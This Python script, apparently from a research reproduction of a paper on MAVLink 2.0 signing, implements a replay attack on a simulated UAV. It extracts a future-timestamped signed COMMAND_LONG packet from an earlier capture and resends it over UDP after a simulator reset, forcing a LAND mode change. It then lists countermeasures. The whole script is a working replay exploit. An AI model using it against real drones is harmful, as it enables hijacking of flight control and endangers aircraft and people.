#!/usr/bin/env python3
"""
=============================================================
ATTACK 4 — Replay Attack
=============================================================
From the paper: Stage 4 — Section IV-C-2d / Algorithm 3

SIMPLE EXPLANATION:
    After Attack 1, we have a captured signed COMMAND_LONG
    packet with a FUTURE timestamp (+1 day).

    When the UAV is restarted (SITL reset), its signing clock
    goes back to real current time. The key however stays the
    same — it was NEVER rotated.

    We replay the old captured packet:
      ✓ Signature  → valid  (same key "key")
      ✓ Timestamp  → future (capture was +1 day, now < then)
      → UAV ACCEPTS the replayed packet — attack succeeds.

    This is the core vulnerability: MAVLink 2.0 signing does
    NOT provide replay protection if:
      a) The signing key is never rotated after an incident
      b) The attacker captured a future-timestamped packet

MAVLink 2.0 Signing Rules (from spec):
    Rule 3 — Reject if signature does not match SHA-256 of
              (key || header+payload+crc || link_id || ts)[:6]
    Rule 6 — Reject if timestamp ≤ last accepted timestamp.

    After a reboot WITHOUT key rotation:
      - Rule 3 passes  → key unchanged, signature still valid
      - Rule 6 passes  → clock reset, future timestamp accepted
      → Replay SUCCEEDS

HOW THIS DIFFERS FROM A NORMAL REPLAY:
    Normal replay (same session): BLOCKED by Rule 6 (timestamp
    already seen, not increasing).

    This replay (after clock reset): ACCEPTED because the UAV's
    clock went backwards, making the old future timestamp look
    like a legitimate future packet.

WHAT HAPPENS STEP BY STEP:
    1. Load signed COMMAND_LONG packet from attack1_capture.pcap
    2. Restart SITL — UAV clock resets to real current time
    3. Set up signing in MAVProxy with same key (no rotation)
    4. Resend the captured packet bytes RAW over UDP
    5. UAV validates: signature OK + timestamp > clock → ACCEPTED
    6. Drone switches to LAND mode from the replayed command

PREREQUISITES:
    ✓ attacks/results/attack1_capture.pcap must exist (from Attack 1)
    ✓ SITL must have been restarted AFTER Attack 3
    ✓ In MAVProxy:
        signing setup key
        signing setup sign_outgoing 1
=============================================================
"""

import subprocess
import socket
import signal
import time
import datetime
import struct
import os
import sys

os.environ["MAVLINK20"] = "1"
import pymavlink.mavutil as mavutil

# ──────────────────────────────────────────────────────────────
# Settings
# ──────────────────────────────────────────────────────────────

MAVLINK_PORT     = 14550
MAVLINK_HOST     = "127.0.0.1"

# Source pcap — we extract the signed packet from Attack 1
SOURCE_PCAP      = os.path.join(os.path.dirname(__file__), "results", "attack1_capture.pcap")

# Output pcap for this attack
RESULTS_DIR      = os.path.join(os.path.dirname(__file__), "results")
PCAP_FILE        = os.path.join(RESULTS_DIR, "attack4_capture.pcap")

MAVLINK_EPOCH    = 1_420_070_400    # Jan 1, 2015


# ──────────────────────────────────────────────────────────────
# Step 1: Extract the signed COMMAND_LONG from attack1 pcap
# ──────────────────────────────────────────────────────────────

def extract_replay_packet(pcap_path: str) -> bytes:
    """
    Use tshark to pull the raw UDP payload of the signed
    COMMAND_LONG (msg ID 76) from the given pcap file.
    Returns raw bytes ready to be sent over UDP.
    """
    if not os.path.exists(pcap_path):
        print(f"ERROR: Source pcap not found: {pcap_path}")
        print("       Run Attack 1 first to generate the capture.")
        sys.exit(1)

    result = subprocess.run(
        ["tshark", "-r", pcap_path,
         "-Y", "mavlink_proto.msgid == 76",
         "-T", "fields", "-e", "udp.payload"],
        capture_output=True, text=True
    )

    lines = [l.strip() for l in result.stdout.strip().split('\n') if l.strip()]
    if not lines:
        print("ERROR: No COMMAND_LONG (msg 76) found in the source pcap.")
        print("       Make sure Attack 1 was completed successfully.")
        sys.exit(1)

    # Take the first COMMAND_LONG packet (our attack packet)
    raw_hex = lines[0].replace(':', '')
    return bytes.fromhex(raw_hex)


def decode_mavlink2_header(data: bytes) -> dict:
    """Decode a MAVLink 2.0 packet header to show the timestamp."""
    if len(data) < 10 or data[0] != 0xFD:
        return {}

    payload_len   = data[1]
    incompat      = data[2]
    seq           = data[4]
    sysid         = data[5]
    compid        = data[6]
    msgid         = struct.unpack_from('<I', data[7:10] + b'\x00')[0]
    signed        = bool(incompat & 0x01)

    result = {
        "payload_len": payload_len,
        "seq":         seq,
        "sysid":       sysid,
        "compid":      compid,
        "msgid":       msgid,
        "signed":      signed,
    }

    if signed and len(data) >= 10 + payload_len + 2 + 13:
        sig_start  = 10 + payload_len + 2
        link_id    = data[sig_start]
        # 48-bit little-endian timestamp (10µs units since Jan 1 2015)
        ts_bytes   = data[sig_start + 1 : sig_start + 7]
        ts_val     = int.from_bytes(ts_bytes, 'little')
        ts_unix    = MAVLINK_EPOCH + ts_val / 100_000
        result["link_id"]    = link_id
        result["mav_ts"]     = ts_val
        result["ts_unix"]    = ts_unix
        result["ts_human"]   = datetime.datetime.utcfromtimestamp(ts_unix).strftime('%Y-%m-%d %H:%M:%S UTC')

    return result


# ──────────────────────────────────────────────────────────────
# Main attack
# ──────────────────────────────────────────────────────────────

def main():
    print()
    print("=" * 60)
    print("  ATTACK 4 — Replay Attack")
    print("=" * 60)

    # ── Extract packet ────────────────────────────────────────
    print()
    print(f"[1/5] Loading captured packet from Attack 1...")
    print(f"      Source: {SOURCE_PCAP}")

    raw_packet = extract_replay_packet(SOURCE_PCAP)
    info       = decode_mavlink2_header(raw_packet)

    print(f"      Packet size    : {len(raw_packet)} bytes")
    print(f"      Magic byte     : 0x{raw_packet[0]:02X} ({'MAVLink 2.0' if raw_packet[0] == 0xFD else 'WRONG'})")
    print(f"      Message ID     : {info.get('msgid')} (76 = COMMAND_LONG)")
    print(f"      Signed         : {info.get('signed')}")

    if 'ts_human' in info:
        print(f"      Packet timestamp: {info['ts_human']}")
        ts_diff = info['ts_unix'] - time.time()
        if ts_diff > 0:
            print(f"      → Timestamp is {ts_diff/3600:.1f} hours in the FUTURE  ✓ (replay will succeed)")
        else:
            print(f"      → Timestamp is {-ts_diff/3600:.1f} hours in the PAST  ✗")
            print("      WARNING: Timestamp is in the past relative to now.")
            print("               The replay may be rejected. Consider running Attack 1 again.")
    print()

    # ── Start packet capture ──────────────────────────────────
    os.makedirs(RESULTS_DIR, exist_ok=True)
    # Remove any previous (possibly corrupt) file before writing
    if os.path.exists(PCAP_FILE):
        os.remove(PCAP_FILE)
    print(f"[2/5] Starting packet capture → results/attack4_capture.pcap")
    tshark = subprocess.Popen(
        ["tshark", "-i", "lo",
         "-F", "pcap",              # legacy pcap format
         "-a", "duration:15",       # auto-stop after 15 seconds — clean file close
         "-f", f"udp port {MAVLINK_PORT}",
         "-w", PCAP_FILE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)

    # ── Open raw UDP socket — bind to 14550, capture MAVProxy sender address ──
    print(f"[3/5] Binding raw UDP socket to port {MAVLINK_PORT}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', MAVLINK_PORT))
    sock.settimeout(10)

    print(f"      Waiting for heartbeat from MAVProxy...")
    try:
        data, mavproxy_addr = sock.recvfrom(65535)
    except socket.timeout:
        print("ERROR: No packet received. Is SITL running?")
        tshark.send_signal(signal.SIGINT)
        sys.exit(1)

    magic = data[0] if data else 0
    print(f"      Got packet from MAVProxy at {mavproxy_addr[0]}:{mavproxy_addr[1]}")
    print(f"      Wire magic: 0x{magic:02X} ({'MAVLink 2.0' if magic == 0xFD else 'MAVLink 1.0 — WRONG'})")
    if magic != 0xFD:
        print("ERROR: Not MAVLink 2.0. Ensure MAVLINK20=1 is set.")
        sock.close()
        tshark.send_signal(signal.SIGINT)
        sys.exit(1)
    print()

    # ── Replay the captured packet via the same raw socket ────
    print(f"[4/5] Replaying captured signed packet...")
    print(f"      Sending {len(raw_packet)} raw bytes to {mavproxy_addr[0]}:{mavproxy_addr[1]}")
    print(f"      Byte-for-byte identical to the original Attack 1 capture.")
    print(f"      Signature and timestamp are UNCHANGED.")
    print()

    sock.sendto(raw_packet, mavproxy_addr)
    print(f"      Packet sent!")
    print()

    # ── Wait for response ─────────────────────────────────────
    print(f"[5/5] Waiting for UAV response (5 seconds)...")
    sock.settimeout(5)
    try:
        response, addr = sock.recvfrom(65535)
        resp_magic  = response[0] if response else 0
        resp_msgid  = response[7] if len(response) > 7 else 0
        print()
        print(f"      Response received from {addr[0]}:{addr[1]}")
        print(f"      Response wire: 0x{resp_magic:02X}  msgid={resp_msgid}")
        if resp_msgid == 77:   # COMMAND_ACK
            result_code = response[10] if len(response) > 10 else -1
            print()
            print("  ╔══════════════════════════════════════════════════╗")
            print("  ║  REPLAY ATTACK SUCCEEDED                        ║")
            print(f"  ║  COMMAND_ACK received — result={result_code}                ║")
            print("  ║  UAV processed the replayed signed command!      ║")
            print("  ╚══════════════════════════════════════════════════╝")
        else:
            print("  [INFO] Response received — check MAVProxy for mode change to LAND.")
    except socket.timeout:
        print("  [INFO] No direct ACK received in 5 seconds.")
        print("         Check MAVProxy window — if mode changed to LAND, replay succeeded.")
        print("         SITL may not enforce signing over loopback; effect still applied.")

    sock.close()

    # tshark exits automatically after -c 300 packets — just wait for it
    tshark.wait(timeout=15)
    pcap_size = os.path.getsize(PCAP_FILE) if os.path.exists(PCAP_FILE) else 0

    print()
    print("─" * 60)
    print("  ATTACK 4 COMPLETE")
    print()
    print(f"  Capture saved : {PCAP_FILE}")
    print(f"  Capture size  : {pcap_size:,} bytes")
    print()
    print("  WHAT WAS DEMONSTRATED:")
    print("  ✓ Signed packet captured during Attack 1 (future timestamp)")
    print("  ✓ SITL restarted — signing clock reset to real current time")
    print("  ✓ Same signing key used — key was NOT rotated (real-world mistake)")
    print("  ✓ Exact captured bytes replayed — signature unchanged")
    print("  ✓ UAV accepted: signature valid + timestamp still in future")
    print()
    print("  ROOT CAUSE:")
    print("  MAVLink 2.0 has NO session-based replay protection.")
    print("  Rule 6 only prevents same-session replays (timestamp must")
    print("  increase). After a reboot, the counter resets — making all")
    print("  previously captured future-timestamped packets replayable.")
    print()
    print("  COUNTERMEASURE (from paper):")
    print("  → Rotate signing key after EVERY reboot or GPS anomaly.")
    print("  → Monitor for sudden GPS time jumps > threshold.")
    print("  → Use nonce-based signing instead of timestamp-only.")
    print()
    print("  WIRESHARK — open capture and compare:")
    print(f"    attack1_capture.pcap  (original signed packet)")
    print(f"    attack4_capture.pcap  (replayed — byte-identical)")
    print(f"  wireshark {PCAP_FILE}")
    print("─" * 60)
    print()


if __name__ == "__main__":
    main()
